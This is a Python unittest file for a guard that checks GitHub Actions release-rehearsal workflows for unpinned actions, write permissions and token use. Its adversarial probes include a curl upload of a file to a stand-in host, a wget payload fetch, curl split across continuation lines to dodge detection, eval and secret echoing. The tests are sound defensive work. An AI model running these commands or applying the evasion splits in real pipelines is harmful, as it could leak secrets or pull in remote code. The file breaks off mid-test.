"""Tests for scripts/release_rehearsal/workflow_guard.py (issue #9)."""

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from scripts.release_rehearsal import workflow_guard as wg

GOOD_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          persist-credentials: false
      - run: make release-check
"""


class GoodWorkflowTests(unittest.TestCase):
    def test_no_violations(self):
        self.assertEqual(wg.validate_workflow_text(GOOD_WORKFLOW), [])

    def test_immutable_sha_checkout_ref_accepted(self):
        text = GOOD_WORKFLOW.replace(
            "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "actions/checkout@" + "b" * 40
        )
        self.assertEqual(wg.validate_workflow_text(text), [])


class TriggerViolationTests(unittest.TestCase):
    def test_push_trigger_rejected(self):
        text = GOOD_WORKFLOW.replace(
            'on:\n  pull_request:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
            'on:\n  push:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("disallowed trigger" in v for v in violations))


class PermissionViolationTests(unittest.TestCase):
    def test_missing_top_level_permissions(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read\n\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))

    def test_write_permission_rejected(self):
        text = GOOD_WORKFLOW.replace("contents: read", "contents: write")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_contents_write_anywhere_rejected(self):
        text = GOOD_WORKFLOW + "\n# contents: write (job override attempt)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class CheckoutViolationTests(unittest.TestCase):
    def test_unpinned_checkout_ref_rejected(self):
        text = GOOD_WORKFLOW.replace("actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "actions/checkout@main")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations))

    def test_missing_persist_credentials_false_rejected(self):
        text = GOOD_WORKFLOW.replace("          persist-credentials: false\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("persist-credentials" in v for v in violations))


class GeneralizedActionPinTests(unittest.TestCase):
    """issue #9 mandatory correction #1: EVERY external `uses:` reference
    -- not only `actions/checkout` -- must be pinned to an exact,
    immutable 40-lowercase-hex commit SHA; there is no mutable-tag
    allowlist (not even a major-version tag like `v7`/`v4`) any more."""

    SHA_A = "a" * 40
    SHA_B = "b" * 40

    def test_mutable_major_version_tag_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/upload-artifact-totally-unrelated@v4\n"
        # (upload-artifact* is separately/additionally rejected by the
        # dangerous-action-name heuristic; use a name-neutral action here
        # so only the pin-shape rule is exercised)
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python@v5\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("actions/setup-python@v5" in v and "not pinned to an immutable" in v for v in violations))

    def test_semver_tag_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python@v5.1.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("v5.1.0" in v and "not pinned to an immutable" in v for v in violations))

    def test_branch_name_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python@main\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("actions/setup-python@main" in v for v in violations))

    def test_short_sha_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python@0123abc\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("0123abc" in v for v in violations))

    def test_uppercase_sha_rejected(self):
        """A full 40-character hex string is still rejected if it is not
        all-lowercase -- this repository's own canonical SHA rendering
        (and every other exact-SHA check in this release-rehearsal
        system) is always lowercase; an uppercase/mixed-case ref is
        never silently treated as equivalent."""
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python@" + ("A" * 40) + "\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("actions/setup-python@" in v for v in violations))

    def test_malformed_reference_with_no_at_all_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/setup-python\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("has no '@ref' pin at all" in v for v in violations))

    def test_valid_40_hex_sha_for_a_second_action_accepted(self):
        text = GOOD_WORKFLOW + f"\n      - uses: actions/setup-python@{self.SHA_B}\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])

    def test_local_action_reference_exempt_from_sha_pin(self):
        """The single, explicit, narrow safe-local-action rule: a
        `./`-prefixed reference needs no separate SHA (it is implicitly
        pinned to the workflow's own commit)."""
        text = GOOD_WORKFLOW + "\n      - uses: ./.github/actions/local-thing\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "local-thing" in v], [])

    def test_parent_relative_local_action_reference_exempt(self):
        text = GOOD_WORKFLOW + "\n      - uses: ../shared-actions/thing\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "shared-actions" in v], [])

    def test_is_local_action_reference_helper(self):
        self.assertTrue(wg.is_local_action_reference("./.github/actions/foo"))
        self.assertTrue(wg.is_local_action_reference("../shared/foo"))
        self.assertFalse(wg.is_local_action_reference("actions/checkout"))
        self.assertFalse(wg.is_local_action_reference("docker://alpine:3"))


class FlowMappingUsesTests(unittest.TestCase):
    """Issue #9 code-review finding #1: a `uses:` occurrence hidden
    inside a valid YAML flow mapping (`- {uses: ..., with: {...}}`) must
    be found and validated exactly like an ordinary block-style
    `- uses: ...` step -- the previous line-anchored regex never
    matched it at all, so a mutable ref hidden this way silently
    bypassed every pin check."""

    SHA_A = "a" * 40

    def test_flow_mapping_mutable_ref_rejected(self):
        text = GOOD_WORKFLOW + "      - {uses: actions/setup-python@mutable}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(
            any("actions/setup-python@mutable" in v and "not pinned to an immutable" in v for v in violations),
            violations,
        )

    def test_flow_mapping_immutable_ref_accepted(self):
        text = GOOD_WORKFLOW + f"      - {{uses: actions/setup-python@{self.SHA_A}}}\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])

    def test_flow_mapping_with_sibling_keys_mutable_ref_rejected(self):
        text = GOOD_WORKFLOW + "      - {uses: actions/setup-python@mutable, with: {python-version: '3.11'}}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_flow_sequence_containing_flow_mapping_ref_checked(self):
        """A flow mapping nested inside a flow *sequence* (`[...]`) must
        still be found -- flow nesting depth is not limited to one
        level."""
        text = GOOD_WORKFLOW + "      - x: [{uses: actions/setup-python@mutable}]\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_multiline_flow_mapping_ref_checked(self):
        """A flow mapping may legally span several physical lines; the
        `uses:` key inside it must still be found regardless."""
        text = (
            GOOD_WORKFLOW
            + "      - {\n"
            + "          uses: actions/setup-python@mutable,\n"
            + "          with: {python-version: '3.11'}\n"
            + "        }\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)


class QuotedKeyAndValueUsesTests(unittest.TestCase):
    """Issue #9 code-review finding #1: a quoted `"uses":`/`'uses':` key
    (block or flow style), and a quoted `uses:` *value*, must both be
    recognized -- the previous regex only ever matched the bare,
    unquoted word `uses` as a key, and captured a quoted value's
    surrounding quote characters as part of the ref itself (which then
    never matched the pin-shape check at all, silently downgrading a
    real mutable-ref finding into a much vaguer "no @ref pin" one)."""

    SHA_A = "a" * 40

    def test_flow_double_quoted_key_and_value_mutable_rejected(self):
        text = GOOD_WORKFLOW + '      - {"uses": "actions/setup-python@mutable"}\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(
            any("actions/setup-python@mutable" in v and "not pinned to an immutable" in v for v in violations),
            violations,
        )

    def test_flow_single_quoted_key_and_value_mutable_rejected(self):
        text = GOOD_WORKFLOW + "      - {'uses': 'actions/setup-python@mutable'}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_flow_double_quoted_key_and_value_immutable_accepted(self):
        text = GOOD_WORKFLOW + f'      - {{"uses": "actions/setup-python@{self.SHA_A}"}}\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])

    def test_block_double_quoted_key_mutable_rejected(self):
        text = GOOD_WORKFLOW + '      - "uses": actions/setup-python@mutable\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_block_single_quoted_key_mutable_rejected(self):
        text = GOOD_WORKFLOW + "      - 'uses': actions/setup-python@mutable\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_block_double_quoted_value_mutable_rejected(self):
        text = GOOD_WORKFLOW + '      - uses: "actions/setup-python@mutable"\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not pinned to an immutable" in v for v in violations), violations)

    def test_block_single_quoted_value_immutable_accepted(self):
        text = GOOD_WORKFLOW + f"      - uses: 'actions/setup-python@{self.SHA_A}'\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])


class AnchorAliasTagTemplateUsesTests(unittest.TestCase):
    """Issue #9 hardening: a YAML anchor/alias/tag or a GitHub Actions
    `${{ ... }}` expression attached to (or standing in for) a `uses:`
    value can never be statically, safely resolved to a real,
    verifiable pin -- every one of these must be rejected outright
    (fail closed), never silently treated as "no @ref" or, worse,
    silently ignored."""

    SHA_A = "a" * 40

    def test_anchor_prefixed_value_rejected(self):
        text = GOOD_WORKFLOW + f"      - uses: &checkout_ref actions/setup-python@{self.SHA_A}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("anchor" in v.lower() and "rejected fail-closed" in v for v in violations), violations)

    def test_alias_value_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: *some_previously_defined_anchor\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("alias" in v.lower() for v in violations), violations)

    def test_explicit_tag_prefixed_value_rejected(self):
        text = GOOD_WORKFLOW + f"      - uses: !!str actions/setup-python@{self.SHA_A}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("tag" in v.lower() for v in violations), violations)

    def test_template_expression_value_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: ${{ inputs.action_ref }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("template" in v.lower() or "expression" in v.lower() for v in violations), violations)

    def test_template_expression_embedded_in_pin_rejected(self):
        """An expression need not be the *entire* value -- one embedded
        inside an otherwise plausible-looking ref (e.g. an
        expression-interpolated ref segment) must be caught too."""
        text = GOOD_WORKFLOW + "      - uses: actions/setup-python@${{ inputs.pinned_sha }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("template" in v.lower() or "expression" in v.lower() for v in violations), violations)


class CommentsSpacingAndMultipleUsesTests(unittest.TestCase):
    """Comment/whitespace variants, and more than one `uses:` token
    appearing within a single physical text line, must never confuse
    the scanner into missing a real occurrence or manufacturing a fake
    one out of commented-out text."""

    SHA_A = "a" * 40
    SHA_B = "b" * 40

    def test_trailing_comment_mentioning_uses_is_not_a_second_occurrence(self):
        text = GOOD_WORKFLOW + f"      - uses: actions/setup-python@{self.SHA_A}  # see also uses: fake@bad\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])

    def test_extra_inline_whitespace_around_colon_and_value_tolerated(self):
        text = GOOD_WORKFLOW + f"      -    uses:      actions/setup-python@{self.SHA_A}   \n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])

    def test_two_uses_occurrences_in_two_flow_mappings_on_one_line_both_checked(self):
        """Two entirely separate flow-mapping steps happen to be
        written on the same physical text line: both must still be
        individually found and validated (one immutable, one mutable)."""
        text = (
            GOOD_WORKFLOW
            + f"      - {{uses: actions/setup-python@{self.SHA_A}}}\n"
            + "      - {uses: actions/setup-node@mutable}\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual([v for v in violations if "setup-python" in v], [])
        self.assertTrue(any("setup-node" in v and "not pinned to an immutable" in v for v in violations), violations)

    def test_duplicate_uses_key_within_same_flow_mapping_rejected(self):
        """Two `uses:` keys inside the very *same* flow mapping is
        invalid YAML (a mapping must never repeat a key) -- this must
        be rejected outright, regardless of whether either value would
        otherwise have been an acceptable pin."""
        text = GOOD_WORKFLOW + (
            f"      - {{uses: actions/setup-python@{self.SHA_A}, uses: actions/setup-python@{self.SHA_B}}}\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("duplicate" in v.lower() for v in violations), violations)

    def test_duplicate_uses_key_within_same_block_step_rejected(self):
        text = GOOD_WORKFLOW + (
            f"      - uses: actions/setup-python@{self.SHA_A}\n"
            f"        uses: actions/setup-python@{self.SHA_B}\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("duplicate" in v.lower() for v in violations), violations)

    def test_two_uses_in_separate_steps_never_treated_as_duplicate(self):
        """Two *different* steps, each with their own single `uses:`
        key, must never be (mis)flagged as a duplicate-key -- only a
        repeat within the *same* enclosing mapping is ever rejected on
        that basis."""
        text = GOOD_WORKFLOW + (
            f"      - uses: actions/setup-python@{self.SHA_A}\n"
            f"      - uses: actions/setup-node@{self.SHA_B}\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertFalse(any("duplicate" in v.lower() for v in violations), violations)


class MalformedUnsupportedUsesShapeTests(unittest.TestCase):
    """A `uses:` value shape this scanner cannot fully, unambiguously
    parse must always fail closed -- never be silently skipped, and
    never be downgraded into a vaguer/weaker finding than the real
    problem actually is."""

    SHA_A = "a" * 40

    def test_unterminated_double_quote_rejected(self):
        text = GOOD_WORKFLOW + f'      - uses: "actions/setup-python@{self.SHA_A}\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("unterminated" in v.lower() for v in violations), violations)

    def test_unterminated_single_quote_rejected(self):
        text = GOOD_WORKFLOW + f"      - uses: 'actions/setup-python@{self.SHA_A}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("unterminated" in v.lower() for v in violations), violations)

    def test_ambiguous_embedded_colon_in_value_rejected(self):
        """An unquoted `:` followed by whitespace inside a plain value
        looks exactly like an unintended nested mapping key to a real
        YAML parser too -- this scanner refuses to guess and fails
        closed instead of silently accepting a truncated/garbled ref."""
        text = GOOD_WORKFLOW + f"      - uses: actions/setup-python@{self.SHA_A} uses: fake@bad\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("ambiguous" in v.lower() or "nested mapping" in v.lower() for v in violations), violations)

    def test_empty_uses_value_rejected_as_missing_pin(self):
        text = GOOD_WORKFLOW + "      - uses:\n        with: {}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("has no '@ref' pin at all" in v for v in violations), violations)

    def test_docker_reference_without_sha_pin_rejected(self):
        """A Docker `docker://...` reference is never carved out as a
        safe local action -- see `is_local_action_reference`'s own
        docstring -- so a docker reference must still be pinned to an
        exact 40-lowercase-hex SHA exactly like every other external
        action."""
        text = GOOD_WORKFLOW + "      - uses: docker://alpine:3.19\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker://alpine:3.19" in v for v in violations), violations)


class ForbiddenSubstringTests(unittest.TestCase):
    def test_upload_artifact_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/upload-artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload-artifact" in v for v in violations))

    def test_gh_release_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: gh release create v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh release" in v for v in violations))

    def test_secrets_usage_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: echo ${{ secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v for v in violations))

    def test_git_tag_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: git tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v for v in violations))

    def test_environment_rejected(self):
        text = GOOD_WORKFLOW + "\n    environment: production\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("environment:" in v for v in violations))


class RepositoryStateTests(unittest.TestCase):
    def test_real_release_rehearsal_workflow_is_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_no_release_publish_workflow_exists(self):
        publish_path = ROOT / ".github" / "workflows" / "release-publish.yml"
        self.assertFalse(publish_path.exists())


class ReleaseTargetShaBindingTests(unittest.TestCase):
    """issue #9 verifier remediation: the normal release workflow's
    publication-eligibility steps must bind the exact checked-out commit
    (`${{ github.sha }}`) as `RELEASE_TARGET_SHA`. Deliberately not part
    of `validate_workflow_text()`'s shared aggregator (see that
    function's own module-level docstring) -- tested directly here, and
    exercised end-to-end via `cli.py`'s `workflow-guard` subcommand (see
    `scripts/release_rehearsal/tests/test_cli.py`)."""

    def test_real_workflow_binds_release_target_sha(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_release_target_sha_binding(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_missing_binding_is_rejected(self):
        text = (
            "jobs:\n"
            "  release-rehearsal:\n"
            "    steps:\n"
            "      - run: make release-check\n"
        )
        violations = wg.check_release_target_sha_binding(text)
        self.assertTrue(violations)
        self.assertTrue(any("RELEASE_TARGET_SHA" in v for v in violations))

    def test_present_binding_is_accepted(self):
        text = (
            "jobs:\n"
            "  release-rehearsal:\n"
            "    env:\n"
            "      RELEASE_TARGET_SHA: ${{ github.sha }}\n"
            "    steps:\n"
            "      - run: make release-check\n"
        )
        violations = wg.check_release_target_sha_binding(text)
        self.assertEqual(violations, [])

    def test_rehearse_variant_also_requires_binding(self):
        text = (
            "jobs:\n"
            "  release-rehearsal:\n"
            "    steps:\n"
            "      - run: make release-rehearse\n"
        )
        violations = wg.check_release_target_sha_binding(text)
        self.assertTrue(violations)

    def test_require_eligible_variant_also_requires_binding(self):
        text = (
            "jobs:\n"
            "  release-rehearsal:\n"
            "    steps:\n"
            "      - run: make release-check-require-eligible\n"
        )
        violations = wg.check_release_target_sha_binding(text)
        self.assertTrue(violations)

    def test_workflow_with_no_eligibility_target_at_all_is_never_flagged(self):
        text = (
            "jobs:\n"
            "  other-job:\n"
            "    steps:\n"
            "      - run: echo hello\n"
        )
        violations = wg.check_release_target_sha_binding(text)
        self.assertEqual(violations, [])


# --- issue #9 verifier remediation: adversarial verifier-probe tests -------
# Every probe below encodes one specific evasion/escalation class the
# independent verifier's own findings called out by name. Each is a
# targeted mutation of GOOD_WORKFLOW (or a minimal standalone snippet),
# asserted to be REJECTED (or, for the final class, a realistic dynamic-
# summary workflow asserted to remain CLEAN).

class JobAndNestedPermissionEscalationTests(unittest.TestCase):
    def test_job_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_nested_step_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      permissions:\n        contents: write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_deeply_indented_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "                        contents:      write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents: 'write'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_double_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + '      contents: "write"\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_no_space_after_colon_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_tab_whitespace_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:\twrite\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class AnyScopeWritePermissionTests(unittest.TestCase):
    """issue #9 fresh-review remediation: a workflow permissions guard
    must reject *any* permission scope with value 'write', not merely
    'contents: write'. One adversarial probe per reproduced scope, plus
    inline/flow mappings, quoted keys/values, odd indentation/case, and a
    scope this module's authors have never heard of."""

    def _scope_write_rejected(self, snippet: str) -> None:
        text = GOOD_WORKFLOW + "\n" + snippet + "\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(
            any("write" in v.lower() for v in violations),
            f"expected a write-scope violation for {snippet!r}, got {violations!r}",
        )

    def test_id_token_write_job_level_rejected(self):
        self._scope_write_rejected("      id-token: write")

    def test_packages_write_rejected(self):
        self._scope_write_rejected("      packages: write")

    def test_pull_requests_write_rejected(self):
        self._scope_write_rejected("      pull-requests: write")

    def test_issues_write_rejected(self):
        self._scope_write_rejected("      issues: write")

    def test_actions_write_rejected(self):
        self._scope_write_rejected("      actions: write")

    def test_checks_write_rejected(self):
        self._scope_write_rejected("      checks: write")

    def test_deployments_write_rejected(self):
        self._scope_write_rejected("      deployments: write")

    def test_statuses_write_rejected(self):
        self._scope_write_rejected("      statuses: write")

    def test_future_unknown_scope_write_rejected(self):
        """A scope this module's authors have never heard of must still
        be rejected -- this is a generalized rule, never a fixed
        enumeration of "known" scope names (see
        `_DANGEROUS_ACTION_NAME_SUBSTRINGS`'s analogous design for
        `uses:` action names)."""
        self._scope_write_rejected("      something-new: write")

    def test_inline_flow_mapping_write_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "permissions:\n  contents: read",
            "permissions: {contents: read, id-token: write}",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_inline_flow_mapping_with_unknown_scope_rejected(self):
        text = GOOD_WORKFLOW + "\n      permissions: {contents: read, something-new: write}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_quoted_scope_key_write_rejected(self):
        self._scope_write_rejected('      "id-token": write')

    def test_single_quoted_scope_key_write_rejected(self):
        self._scope_write_rejected("      'id-token': write")

    def test_quoted_write_value_rejected(self):
        self._scope_write_rejected('      id-token: "write"')

    def test_single_quoted_write_value_rejected(self):
        self._scope_write_rejected("      id-token: 'write'")

    def test_uppercase_scope_and_value_rejected(self):
        self._scope_write_rejected("      ID-TOKEN: WRITE")

    def test_mixed_case_scope_and_value_rejected(self):
        self._scope_write_rejected("      Id-Token: Write")

    def test_no_space_after_colon_rejected(self):
        self._scope_write_rejected("      id-token:write")

    def test_extra_spacing_around_colon_rejected(self):
        self._scope_write_rejected("      id-token   :    write")

    def test_odd_deep_indentation_rejected(self):
        self._scope_write_rejected("                                id-token: write")

    def test_write_all_shorthand_for_unknown_scope_rejected(self):
        self._scope_write_rejected("      something-new: write-all")

    def test_legitimate_workflow_with_only_top_level_contents_read_remains_accepted(self):
        """Hardening this check must never produce a false positive
        against the real, legitimate, read-only workflow shape."""
        self.assertEqual(wg.validate_workflow_text(GOOD_WORKFLOW), [])

    def test_real_workflow_file_has_no_write_scope_anywhere(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_no_write_anywhere(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class ShorthandPermissionTests(unittest.TestCase):
    def test_scalar_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: write-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v or "does not declare" in v for v in violations))

    def test_job_level_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions: write-all",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v for v in violations))

    def test_read_all_shorthand_is_conservatively_rejected(self):
        """This checker requires the explicit, unambiguous
        'contents: read' mapping block form -- a scalar 'read-all'
        shorthand (even though semantically safe) is conservatively
        rejected (as an unrecognized/missing top-level permissions
        block) rather than specially recognized, per this module's
        fail-closed-on-ambiguity design."""
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: read-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))


class TokenAndSecretsInterpolationTests(unittest.TestCase):
    def test_github_token_interpolation_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ github.token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v for v in violations))

    def test_github_token_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ GitHub.Token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v.lower() for v in violations))

    def test_explicit_github_token_env_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: gh api /rate_limit\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v or "gh_token" in v.lower() for v in violations))

    def test_secrets_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ Secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets" in v.lower() for v in violations))


class CommandIndirectionAndEvasionTests(unittest.TestCase):
    """Command-continuation/variable/subshell/eval/base64/'sh -c' evasion
    probes -- issue #9 verifier remediation."""

    def test_curl_rejected(self):
        text = GOOD_WORKFLOW + "      - run: curl https://example.invalid/upload -d @out.bin\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations))

    def test_wget_rejected(self):
        text = GOOD_WORKFLOW + "      - run: wget https://example.invalid/payload\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("wget" in v for v in violations))

    def test_curl_split_across_continuation_line_rejected(self):
        """A dangerous command split across a shell line-continuation
        (trailing backslash) must not evade detection just because the
        literal substring "curl" is not on the same physical line as the
        rest of the command."""
        text = GOOD_WORKFLOW + "      - run: |\n          cu\\\nrl https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        # "cu\\\nrl" normalizes to "curl" once the continuation is collapsed.
        self.assertTrue(any("curl" in v for v in violations))

    def test_curl_split_with_equally_indented_continuation_rejected(self):
        """Issue #9 fresh-review finding: the *realistic* shape of a
        dangerous split inside a YAML `run: |` block scalar is not a
        zero-indent continuation line -- it is a continuation line
        indented to line up with its sibling script lines (exactly what
        an author, or an adversary imitating an author, would actually
        write, and exactly what YAML's block-scalar dedent + POSIX
        shell backslash-newline splicing together turn into a single
        joined `curl` command with no separator at all). A normalizer
        that only strips the backslash+newline and leaves the
        continuation line's leading indentation in place would still
        see two separate whitespace-separated words ("cu" and "rl ...")
        and miss this entirely."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          cu\\\n"
            + "          rl https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations), violations)

    def test_gh_release_split_with_equally_indented_continuation_rejected(self):
        """Same fresh-review finding, for the `gh release` mutating-CLI
        pattern specifically: `gh rel\\` + an equally-indented `ease
        create ...` continuation line must normalize to the single,
        dangerous `gh release create ...` invocation, not to
        `gh rel        ease create ...` (two harmless-looking words)."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          gh rel\\\n"
            + "          ease create v1.0.0\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh release" in v.lower() for v in violations), violations)

    def test_git_push_split_with_equally_indented_continuation_rejected(self):
        """Same fresh-review finding, for a ref-mutating `git push`
        command split as `git pu\\` + an equally-indented `sh
        origin --tags` continuation line."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          git pu\\\n"
            + "          sh origin --tags\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v.lower() for v in violations), violations)

    def test_curl_split_with_equally_indented_crlf_continuation_rejected(self):
        """The same equally-indented mid-token continuation, but using
        CRLF line endings (as a workflow file checked out on/authored
        with Windows-style line endings would have), must be handled
        identically."""
        text = (
            GOOD_WORKFLOW.replace("\n", "\r\n")
            + "      - run: |\r\n"
            + "          cu\\\r\n"
            + "          rl https://example.invalid\r\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations), violations)

    def test_eval_rejected(self):
        text = GOOD_WORKFLOW + "      - run: eval \"$SOME_VAR\"\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("eval" in v for v in violations))

    def test_base64_decode_pipe_to_shell_rejected(self):
